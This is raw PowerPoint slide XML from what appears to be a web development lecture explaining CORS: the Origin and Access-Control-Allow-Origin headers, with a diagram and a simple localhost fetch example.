              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t>HEADERS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962050" y="1496596"/>
            <a:ext cx="10368915" cy="4027170"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="48895" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="385"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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CORS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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header-based</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="245"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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browser</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>attaches</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-8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an</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Origin</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-65" b="1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header</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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outgoing</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-8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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>fetch</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>requests</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="219"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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server</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-2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can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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include</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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its</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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response</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Access-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-20" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Control-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Allow-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Origin</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-65" b="1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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>header</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="200"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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value</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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this</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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header</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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specifies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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which</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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origins</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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are</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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allowed</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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use</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>data</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="220"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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E.g.:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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 spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Access-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-20" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Control-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Allow-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Origin:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-40" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-15" b="1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means</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-2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that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-1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every</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-1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origin</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-2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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-2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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>allowed!</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="215"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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E.g.:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="3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 spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Access-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-20" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Control-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Allow-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Origin:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="25" b="1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 spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://localhost:3001</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="204"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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If</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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no</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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header</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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specified,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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default</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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 spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>cross-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origin</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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requests</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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are</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>forbidden</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="215"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Browsers</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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check</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Access-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-20" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Control-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Allow-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Origin</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-45" b="1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header</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-2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matches</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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with</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Origin</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="220"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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If</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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so,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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client</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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code</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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allowed</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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access</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>data</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="204"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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Otherwise,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-8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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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request</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>blocked</a:t>
            </a:r>
            <a:endParaRPr sz="2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40"/>
              <a:t>CORS:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-195"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t>VISUALIZED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="object 3" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="882396" y="1565147"/>
            <a:ext cx="4139565" cy="4493260"/>
            <a:chOff x="882396" y="1565147"/>
            <a:chExt cx="4139565" cy="4493260"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="4" name="object 4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82396" y="1565147"/>
              <a:ext cx="4139184" cy="1895107"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5" name="object 5" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="908304" y="2263139"/>
              <a:ext cx="4084320" cy="3794760"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="4084320" h="3794760">
                  <a:moveTo>
                    <a:pt x="4084320" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="3794760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4084320" y="3794760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="408432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" name="object 6" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="877633" y="1560385"/>
            <a:ext cx="4149090" cy="4621530"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="111F35"/>
            </a:solidFill>
          </a:ln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ct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="16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6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6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6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6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6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6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750"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="121920">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>fetch(</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>"http://localhost:3000/data"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="455930" marR="1793875" indent="-334010">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>.then(data</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-35">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-40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dirty="0" sz="1600" spc="-50">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>{ </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>data.json().then(</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="789305">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>data</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-20">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1600" spc="-25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dirty="0" sz="1600" spc="-20">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>{...</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9525000" y="1801367"/>
            <a:ext cx="1784985" cy="1972310"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="006379"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="00252F"/>
            </a:solidFill>
          </a:ln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ct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="1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355"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="214629">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="5"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>localhost:3000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8" name="object 8" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5003291" y="2039111"/>
            <a:ext cx="6325870" cy="1851660"/>
            <a:chOff x="5003291" y="2039111"/>
            <a:chExt cx="6325870" cy="1851660"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="object 9" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5022342" y="2039111"/>
              <a:ext cx="4503420" cy="1393190"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="4503420" h="1393189">
                  <a:moveTo>
                    <a:pt x="4503420" y="1316736"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="114300" y="1316736"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="114300" y="1278636"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1335786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="114300" y="1392936"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="114300" y="1354836"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4503420" y="1354836"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4503420" y="1316736"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="4503420" h="1393189">
                  <a:moveTo>
                    <a:pt x="4503420" y="57150"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4465320" y="38100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4389120" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4389120" y="38100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="38100"/>
                  </a:lnTo>
                  <a:lnTo>
